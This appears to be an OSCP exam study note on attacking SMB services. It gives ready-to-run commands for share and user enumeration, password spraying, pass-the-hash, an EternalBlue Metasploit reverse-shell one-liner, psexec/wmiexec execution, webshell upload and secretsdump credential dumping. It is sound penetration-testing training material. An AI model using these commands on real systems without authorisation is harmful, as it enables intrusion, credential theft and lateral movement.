# 🪟 SMB — Ports 139 / 445

> **Server Message Block** — Windows (and Samba on Linux) file/printer sharing + a whole lot of Windows internals (auth, IPC, remote admin). One of the two richest OSCP attack surfaces. If 445 is open, you slow down and work it hard.

Related: [[Active Directory]] · [[Windows Privilege Escalation]] · [[Credential Attacks]] · [[Shells]] · [[RPC]]

---

## 🧠 PORT 139/445 → THINK

The instant you see 139/445, these should fire in your head:

- **Null session?** Can I list shares/users with *no* creds? (`-N`, `-u "" -p ""`)
- **Anonymous shares?** Readable/writable shares → config files, creds, source, backups.
- **SMB version?** Old = **EternalBlue (MS17-010)**, SambaCry, etc.
- **Is this a Domain Controller?** (445 + 88 + 389 + 53) → pivot to [[Active Directory]].
- **RID cycling** to enumerate users even when share list is empty.
- **Do I have creds already?** → `crackmapexec`/`smbexec`/`psexec`/`winrm` for a shell + spray everywhere.
- **Signing not required?** → potential NTLM relay ([[Active Directory]]).

---

## ⚡ QUICK TRIAGE (verdict in 60 seconds)

```bash
export IP=10.10.10.10
```

```bash
nmap -p139,445 --script smb-os-discovery,smb2-security-mode $IP
```

```bash
netexec smb $IP                      # OS, hostname, domain, signing, SMBv1
```

```bash
netexec smb $IP -u '' -p '' --shares # null-session share list
```

**One-line verdict logic:**
- Shares list with `READ`/`WRITE` on null → 🟢 go dig now.
- `[+] ... (signing:False)` + old Windows → EternalBlue candidate.
- Domain name shown → treat as [[Active Directory]] and enumerate users.
- Everything requires auth + patched → note it, keep the OS/domain info, move on; return with any creds you find.

> `netexec` is the maintained successor to `crackmapexec`. On modern Kali both `netexec` and `nxc` exist; older boxes/writeups use `crackmapexec`/`cme`. Commands are interchangeable — use whichever is installed.

---

## ⏱️ 5-MINUTE ENUMERATION

```bash
# 1) Identity + posture
netexec smb $IP                                  # hostname, domain, OS build, SMBv1, signing
```

```bash
# 2) Shares — null and guest
netexec smb $IP -u '' -p '' --shares             # null session
```

```bash
netexec smb $IP -u 'guest' -p '' --shares        # guest fallback
```

```bash
smbclient -N -L //$IP/                            # classic anonymous share list
```

```bash
# 3) Known-CVE quick check
nmap -p445 --script smb-vuln-ms17-010 $IP        # EternalBlue
```

```bash
# 4) Users (if null/guest works, or later with creds)
netexec smb $IP -u '' -p '' --users
```

```bash
netexec smb $IP -u '' -p '' --rid-brute          # RID cycling — works even when --users is blocked
```

**What to look for:** any share not named ADMIN$/C$/IPC$ that returns without error; `READ`/`WRITE` perms; a domain name; SMBv1 enabled; `signing:False`.

---

## 🔬 15–30 MINUTE DEEP ENUMERATION

```bash
# Enumerate contents of each readable share (interactive)
smbclient -N //$IP/ShareName
#   smb> ls
#   smb> recurse ON ; prompt OFF ; mget *      # pull everything
```

```bash
# Recursive spidering without going interactive
netexec smb $IP -u '' -p '' -M spider_plus                     # dumps a JSON map of every file
```

```bash
netexec smb $IP -u 'user' -p 'pass' --shares                   # re-list once authenticated (more shares appear)
```

```bash
# Full protocol enumerator (users, groups, shares, policy, printers)
enum4linux-ng -A $IP | tee enum4linux.txt
```

```bash
# Mount a share to grep it locally
mkdir /mnt/smb && sudo mount -t cifs //$IP/ShareName /mnt/smb -o username=guest,password=,vers=3.0
```

```bash
grep -riE 'pass|pwd|secret|cred|conn|user' /mnt/smb 2>/dev/null
```

```bash
# Password policy (lockout matters before you brute anything!)
netexec smb $IP -u '' -p '' --pass-pol
```

```bash
crackmapexec smb $IP --pass-pol
```

---

## 📖 WHAT — the service

- **Purpose:** File/printer sharing, IPC, and remote Windows administration (auth, RPC-over-SMB named pipes, remote service control).
- **Ports:**
  - **139/tcp** — SMB over NetBIOS (legacy). Implies NetBIOS name service on **137/udp**, datagram on **138/udp**.
  - **445/tcp** — SMB directly over TCP (modern). This is the one you'll usually target.
- **Implementations:** Microsoft SMB (Windows), **Samba** (Linux/Unix). `smb-os-discovery`/`netexec` tells you which.
- **Dialects:** SMBv1 (CIFS — insecure, EternalBlue territory), SMBv2, SMBv3 (encryption/signing).
- **Auth mechanisms:**
  - **Null session** — anonymous, empty user + empty password (`-u '' -p ''`). Historically leaked users/shares/policy.
  - **Guest** — the `guest` account, often password-less.
  - **NTLM / Kerberos** — domain or local credentials; also **pass-the-hash** (NTLM hash used directly).
- **Attack surface exposed:** readable/writable shares, user/group enumeration, password policy, version-specific RCE (MS17-010), authenticated code execution (psexec/smbexec/wmiexec), NTLM relay, config/credential files sitting in shares.

## 💡 WHY — why it matters in OSCP

- **Direct initial access:** an unauthenticated RCE (EternalBlue) or a writable share + a scheduled task/webroot = shell.
- **Credential discovery:** shares routinely hold `web.config`, `unattend.xml`, `.kdbx`, scripts with hardcoded passwords, backups.
- **Credential validation & spraying hub:** SMB is the best place to test a found password against many users fast (`netexec smb ... --continue-on-success`).
- **AD foothold:** on a DC, SMB gives users, groups, policy → feeds [[Active Directory]] (AS-REP roasting, Kerberoasting, BloodHound).
- **Lateral movement:** one working cred + SMB exec = shell on every box that trusts it.

---

## 🔎 HOW: MANUAL ENUMERATION

### Version / OS / domain
```bash
nmap -p139,445 --script smb-os-discovery,smb2-security-mode,smb-protocols $IP
```
- **What:** identifies OS build, hostname, domain/workgroup, supported dialects, whether signing is required.
- **Look for:** old Windows builds (Server 2008/7 → MS17-010), `Message signing: disabled/not required` (relay), a **domain** name (→ AD).

### Share listing (anonymous)
```bash
smbclient -N -L //$IP/            # -N = no password, -L = list shares
```

```bash
smbclient -L //$IP/ -U 'guest%'   # guest with empty password
```
- **Interpret:** `IPC$`/`ADMIN$`/`C$` are default admin shares (usually not directly useful without creds). **Custom-named shares** (e.g. `Backups`, `Users`, `Dev`, `Data`) are the prize.
- Blank output but no error still means the null bind *worked* — try RID cycling for users.

### Browse / pull a share
```bash
smbclient -N //$IP/ShareName
# inside:
#   ls
#   recurse ON
#   prompt OFF
#   mget *            # download everything to CWD
#   get "path\to\file"
```

### RID cycling (users without a share)
```bash
netexec smb $IP -u '' -p '' --rid-brute
```

```bash
# or:
enum4linux-ng -R $IP
```

```bash
impacket-lookupsid anonymous@$IP
```
- **Why:** even when `--users` is blocked, SIDs can often be walked to recover usernames. Feeds [[Credential Attacks]] and AS-REP roasting.

## 🤖 HOW: AUTOMATED ENUMERATION

```bash
enum4linux-ng -A $IP | tee enum4linux.txt   # modern rewrite of enum4linux
```

```bash
netexec smb $IP -u '' -p '' --shares --users --pass-pol --rid-brute
```

```bash
nmap --script "smb-enum-* and not brute" -p445 $IP
```
- **enum4linux-ng** aggregates OS info, users, groups, shares, and policy in one shot — great first automated pass, but always verify anything actionable manually.

---

## 🔐 AUTHENTICATION

| Method | Command shape | When |
|---|---|---|
| Null session | `-u '' -p ''` | Always try first |
| Guest | `-u 'guest' -p ''` | If null fails |
| Valid creds | `-u 'user' -p 'pass'` | Anything you found elsewhere |
| Pass-the-Hash | `-u 'user' -H '<NTLMHASH>'` | You have an NT hash, not the plaintext |
| Domain creds | `-u 'user' -p 'pass' -d DOMAIN` | AD environment |

```bash
# Validate one cred everywhere (mark of a shell-capable account = "(Pwn3d!)")
netexec smb $IP -u 'user' -p 'Password1'
```

```bash
netexec smb $IP -u 'user' -H 'aad3b435...:31d6cfe0...'      # pass-the-hash
```
> **`(Pwn3d!)`** in netexec output = that account is local admin on the target → you can get a shell (see EXPLOITATION).

**Brute force (mind the lockout policy — check `--pass-pol` first!):**
```bash
netexec smb $IP -u users.txt -p passwords.txt --continue-on-success
```

```bash
hydra -L users.txt -P passwords.txt smb://$IP        # slower; netexec preferred
```

---

## 👤 USER ENUMERATION

```bash
netexec smb $IP -u '' -p '' --users        # RPC user enum
```

```bash
netexec smb $IP -u '' -p '' --rid-brute    # SID walking (works when --users blocked)
```

```bash
impacket-samrdump $IP                        # SAMR user dump
```

```bash
enum4linux-ng -U $IP
```
Build `users.txt` from this. Feed it into: SMB spraying, [[Kerberos]] AS-REP roasting, [[SMTP]] VRFY, web login forms.

---

## 📂 RESOURCE / FILE ENUMERATION

Once you can read shares, hunt hard:
```bash
netexec smb $IP -u 'user' -p 'pass' -M spider_plus     # JSON of every file in every readable share
```

```bash
# mount + grep is often faster for reading:
sudo mount -t cifs //$IP/Share /mnt/smb -o username=user,password=pass
```

```bash
grep -riE 'password|passwd|pwd|secret|cred|apikey|conn' /mnt/smb
```

```bash
find /mnt/smb -iname '*.kdbx' -o -iname '*.config' -o -iname '*unattend*' -o -iname '*.ps1' -o -iname '*.bak'
```

**High-value files to grab:** `web.config`, `*.config`, `unattend.xml`/`sysprep.xml` (base64 admin pw), `*.kdbx` (KeePass), `id_rsa`, `*.ps1`/`*.bat`/`*.vbs` (hardcoded creds), `*.bak`/`*.old`, `Groups.xml` (GPP `cpassword` — decrypt with `gpp-decrypt`).

## ⚙️ CONFIGURATION ENUMERATION

```bash
netexec smb $IP -u '' -p '' --pass-pol       # lockout threshold, min length, complexity
```

```bash
nmap -p445 --script smb2-security-mode $IP    # signing required? (relay potential)
```
- **Signing not required** → NTLM relay is viable in AD ([[Active Directory]]).
- **Lockout threshold = 0** → brute/spray freely. **> 0** → spray *one* password across many users, slowly.

---

## 🎯 VULNERABILITY IDENTIFICATION

```bash
nmap -p445 --script "smb-vuln-*" $IP          # MS17-010, MS08-067, and more
```

```bash
netexec smb $IP -M ms17-010                    # dedicated EternalBlue check
```

| Vuln | Indicator | Note |
|---|---|---|
| **MS17-010 / EternalBlue** | SMBv1 on Win7/2008/2012 | 🟢 classic OSCP RCE |
| **MS08-067** | very old Win2000/XP/2003 | 🔵 rare, but instant SYSTEM |
| **SambaCry (CVE-2017-7494)** | Samba 3.5.0–4.6.4 + writable share | 🟡 Linux SMB RCE |
| **Anonymous/guest RCE via writable share** | writable share reachable by a web/service path | 🟡 upload webshell/task |

---

## 🗡️ ATTACK VECTORS

### 🟢 HIGH PROB — EternalBlue (MS17-010)
- **What:** pre-auth RCE in SMBv1 → SYSTEM.
- **Identify:** `nmap --script smb-vuln-ms17-010 -p445 $IP` → `State: VULNERABLE`.
- **Validate/exploit:**
```bash
# Metasploit (reliable):
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS $IP; set LHOST tun0; run"
# Manual (OSCP-friendly, e.g. helviojunior/AutoBlue-MS17-010): generate shellcode, run eternalblue_exploit7.py
```
- **Result:** SYSTEM shell. Go straight to POST-EXPLOITATION.

### 🟢 HIGH PROB — Authenticated code execution (you have creds/hash)
```bash
netexec smb $IP -u user -p pass -x 'whoami'        # test command exec
```

```bash
impacket-psexec DOMAIN/user:pass@$IP               # SYSTEM (drops a service; noisy)
```

```bash
impacket-wmiexec DOMAIN/user:pass@$IP              # cleaner, no service
```

```bash
impacket-smbexec DOMAIN/user:pass@$IP
```

```bash
# pass-the-hash variants:
impacket-psexec -hashes :<NThash> user@$IP
```
- **Condition:** account must be **local admin** (netexec shows `(Pwn3d!)`). If it's a low-priv user, try [[WinRM]] with `evil-winrm` instead for a non-admin shell.

### 🟡 MED PROB — Writable share → shell
- **What:** upload a payload/webshell/scheduled item to a share that maps to an executable path (webroot, startup, scripts dir).
```bash
smbclient //$IP/WritableShare -U user%pass -c 'put shell.aspx'    # if share = IIS webroot → browse to it
```

### 🟡 MED PROB — GPP cpassword (domain SYSVOL)
- Find `Groups.xml` in a `SYSVOL`/share → `gpp-decrypt <cpassword>` → domain creds. Feeds [[Active Directory]].

### 🔵 SITUATIONAL — SambaCry / MS08-067 as above.

---

## 🔑 CREDENTIAL HUNTING
Inside every readable share, and after any foothold. One command per block so you can copy-paste each individually.

Recursive grep for secrets across a mounted share:
```bash
grep -riE 'password|pwd|secret|cred|apikey|connectionstring' /mnt/smb
```
Decrypt a GPP `cpassword` from `Groups.xml` (fixed, public AES key → instant plaintext):
```bash
gpp-decrypt <cpassword>
```
> **Windows credential stores to check once you have a shell:** `unattend.xml`, `sysprep.xml`, `web.config`, `Groups.xml` (GPP), `*.kdbx` (KeePass), and PowerShell history.

Everything you find → **[[Credential Attacks]]** → spray across SMB, WinRM, RDP, SSH, web, DB.

---

## 💥 EXPLOITATION → INITIAL ACCESS (decision flow)

```
Open 445
 ├─ smb-vuln-ms17-010 VULNERABLE? ── yes ─▶ EternalBlue ─▶ SYSTEM ✅
 ├─ Have creds/hash?
 │    ├─ netexec shows (Pwn3d!)? ─ yes ─▶ psexec/wmiexec ─▶ SYSTEM ✅
 │    └─ not admin ────────────────────▶ evil-winrm (5985) / read shares / spray
 ├─ Null/guest readable share? ─ yes ─▶ loot files ─▶ creds ─▶ loop back with creds
 ├─ Writable share to exec path? ─ yes ─▶ upload payload ─▶ shell
 └─ Nothing ─▶ keep OS/domain/users, move on; return with creds from other services
```

---

## 🧹 POST-EXPLOITATION (immediately after a shell)

- **Confirm identity/OS:** `whoami /all`, `systeminfo`, `hostname`.
- **If SYSTEM/admin:** dump creds for lateral movement (either tool, one per block):
```bash
  impacket-secretsdump DOMAIN/user:pass@$IP
```
```bash
  netexec smb $IP -u user -p pass --sam --lsa
```
  (secretsdump pulls SAM + LSA + NTDS on a DC.)
- **Loot:** SAM/LSA hashes, `unattend.xml`, browser/PW-manager stores, PowerShell history (`%APPDATA%\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`).
- **Spray** every recovered hash/cred across the subnet (`netexec smb <range> -u user -H hash`).
- **Escalate** if not SYSTEM → [[Windows Privilege Escalation]].
- **On a DC** → [[Active Directory]] (secretsdump NTDS, golden ticket, DCSync).

---

## 🧗 PRIVILEGE ESCALATION CONNECTIONS

- Low-priv shell from SMB → run **winPEAS** / **PowerUp** → [[Windows Privilege Escalation]].
- Local admin (`Pwn3d!`) → already effectively SYSTEM via psexec.
- Domain creds recovered → [[Active Directory]] for domain escalation.

---

## 🔁 FOUND → NEXT (decision table)

| FINDING | MEANING | NEXT ACTION | POSSIBLE RESULT | NEXT DECISION |
|---|---|---|---|---|
| Null session works | Anonymous enum allowed | `--shares --users --rid-brute` | user list, share list | Loot shares / build userlist |
| Readable custom share | Files exposed | mount + `grep -riE 'pass\|cred'` | creds, source, configs | [[Credential Attacks]] spray |
| Writable share | Upload possible | put payload if it maps to exec path | code exec | Shell → post-exploit |
| SMBv1 enabled + old Win | EternalBlue candidate | `smb-vuln-ms17-010` | VULNERABLE | Run EternalBlue → SYSTEM |
| `(Pwn3d!)` on a cred | Local admin | `impacket-psexec` / `wmiexec` | SYSTEM shell | Post-exploit + secretsdump |
| Valid cred, not admin | Foothold-only | try [[WinRM]], read shares | shell / more loot | PrivEsc |
| Domain name present | AD environment | AS-REP/Kerberoast/BloodHound | roastable hashes | [[Active Directory]] |
| `Groups.xml`/GPP found | GPP cpassword | `gpp-decrypt` | domain creds | Spray domain-wide |
| `signing:False` | Relay possible | mitm6/ntlmrelayx (AD) | relayed auth → shell | [[Active Directory]] |
| RID brute yields users | Userlist w/o shares | feed to spray + roasting | valid creds/hashes | Loop back |

---

## 🚧 FAILED → NEXT

| Symptom | Do this |
|---|---|
| `NT_STATUS_ACCESS_DENIED` on shares | Try `guest`; try creds from other services; do RID brute for users |
| `--users` blocked | Use `--rid-brute` (SID walking) — different code path, often still works |
| Null session refused entirely | Hardened box — pivot to finding creds elsewhere, then return |
| `smbclient` protocol negotiation error | Add `-m SMB2` / `-m SMB3`, or `--option='client min protocol=NT1'` for SMBv1 boxes |
| netexec says nothing useful | Fall back to `enum4linux-ng -A` and raw `nmap --script smb-enum-*` |
| Brute locks accounts | Stop. Check `--pass-pol`, switch to slow single-password spray |
| ms17-010 script inconclusive | Try the Metasploit `smb_ms17_010` *auxiliary scanner*; check exact OS/patch level |
| EternalBlue crashes target | Use a smaller/named-pipe variant; verify LHOST/LPORT; try wmiexec if you have creds instead |

---

## 🛠️ TROUBLESHOOTING

```bash
# Force a dialect when negotiation fails:
smbclient -N -L //$IP/ -m SMB2
```

```bash
smbclient -N -L //$IP/ --option='client min protocol=NT1'      # legacy SMBv1 hosts
```

```bash
# Mount with explicit version:
sudo mount -t cifs //$IP/Share /mnt/smb -o username=u,password=p,vers=1.0   # or 2.0 / 3.0
```

## ⚠️ COMMON MISTAKES

- Skipping **RID cycling** when `--users` returns nothing.
- Not re-listing shares **after** getting creds (authenticated view shows more).
- Brute-forcing **before** checking the **lockout policy** → locking the account you need.
- Ignoring `IPC$`-only output as "nothing" — the null bind still worked; enumerate users.
- Forgetting to grep shares recursively for secrets.
- Treating a domain box as standalone (missing the whole [[Active Directory]] path).
- Only trying 445 and never `-m NT1`/vers=1.0 on genuinely old boxes.

---

## 🔗 CREDENTIAL REUSE

Any SMB cred/hash → test on **every** service present:
```bash
# netexec vs crackmapexec — if one is missing, the other has identical syntax.
netexec smb   $IP -u user -p pass          # SMB
```

```bash
netexec winrm $IP -u user -p pass          # WinRM 5985 → evil-winrm shell
```

```bash
netexec ldap  $IP -u user -p pass          # LDAP/AD
```

```bash
netexec mssql $IP -u user -p pass          # MSSQL 1433
```

```bash
evil-winrm -i $IP -u user -p pass          # interactive shell if winrm Pwn3d
```

```bash
xfreerdp /u:user /p:pass /v:$IP            # RDP 3389
```

```bash
ssh user@$IP                                # SSH 22 (Linux/Samba boxes)
```
Also try the SMB password on web logins, DB roots, and as the local admin on other hosts in range. See [[Credential Attacks]].

## 🌐 CROSS-SERVICE ATTACKS

- **SMB users → [[Kerberos]]:** AS-REP roast (`impacket-GetNPUsers`) any user with no pre-auth.
- **SMB users → [[SMTP]] / web forms:** username list for spraying/enumeration.
- **SMB hostname/domain → [[DNS]]:** zone transfer / more hosts.
- **Config files in shares → [[MySQL]]/[[MSSQL]]:** DB connection strings = DB creds.
- **`web.config` in share → [[HTTP]]:** app secrets, machine keys (ViewState), DB creds.
- **Recovered hash → PtH everywhere** (SMB/WinRM/MSSQL).

---

## 🧭 OSCP EXAM MINDSET

An experienced tester seeing 445:
1. Immediately checks **null session + shares + version** in parallel — three commands, ~1 min.
2. Reflexively runs **ms17-010** — a single vuln that ends the box.
3. Reads the **domain field**: standalone vs DC changes the entire plan.
4. Treats SMB as the **credential test bench** — every password found anywhere gets sprayed here first because it's fast and tells you `(Pwn3d!)`.
5. Doesn't get greedy: if it's patched, standalone, and auth-only with no creds yet, they **note the OS/users and leave**, returning the moment creds surface elsewhere.

---

## ✅ DON'T MISS (checklist)

- [ ] Null session shares **and** guest shares
- [ ] SMB **version** + SMBv1 enabled?
- [ ] `smb-vuln-ms17-010` (EternalBlue)
- [ ] `--users` **and** `--rid-brute`
- [ ] Password policy (`--pass-pol`) **before** any brute
- [ ] Signing required? (relay)
- [ ] Recursively **grep every readable share** for creds
- [ ] `unattend.xml` / `Groups.xml` (GPP) / `web.config` / `.kdbx`
- [ ] Re-list shares **after** obtaining creds
- [ ] Domain? → open [[Active Directory]]
- [ ] Every found cred → `netexec smb --continue-on-success` spray

---

## 🛑 STOP CONDITION

Move on when **all** are true:
- Null + guest + any-found-creds enumerated; all readable shares looted & grepped.
- `smb-vuln-*` clean (no MS17-010/08-067).
- No writable share that reaches an executable path.
- No creds obtained here and none available from elsewhere yet.

Keep the **OS, hostname, domain, and userlist** — SMB is the first place to come back to the instant you find a credential on any other service.

---

## 📇 EXAM CHEAT SHEET

```bash
export IP=10.10.10.10
```

```bash
# Identity + posture
netexec smb $IP
```

```bash
nmap -p139,445 --script smb-os-discovery,smb2-security-mode $IP
```

```bash
# Anonymous enum
smbclient -N -L //$IP/
```

```bash
netexec smb $IP -u '' -p '' --shares --users --rid-brute --pass-pol
```

```bash
enum4linux-ng -A $IP
```

```bash
# EternalBlue
nmap -p445 --script smb-vuln-ms17-010 $IP
```

```bash
# Browse / loot
smbclient -N //$IP/Share      # recurse ON; prompt OFF; mget *
```

```bash
netexec smb $IP -u '' -p '' -M spider_plus
```

```bash
# With creds
netexec smb $IP -u user -p pass                 # look for (Pwn3d!)
```

```bash
impacket-psexec  user:pass@$IP                   # SYSTEM
```

```bash
impacket-wmiexec user:pass@$IP                   # quieter
```

```bash
netexec smb $IP -u user -H <NThash>              # pass-the-hash
```

```bash
impacket-secretsdump user:pass@$IP               # dump hashes
```

```bash
gpp-decrypt <cpassword>                          # GPP creds
```

**Sequence:** identity → null/guest shares → ms17-010 → users(+RID) → policy → loot shares → creds → psexec/winrm → secretsdump → spray.

**Kill shots:** MS17-010 (SYSTEM), `(Pwn3d!)` cred → psexec (SYSTEM), looted creds → reuse everywhere.
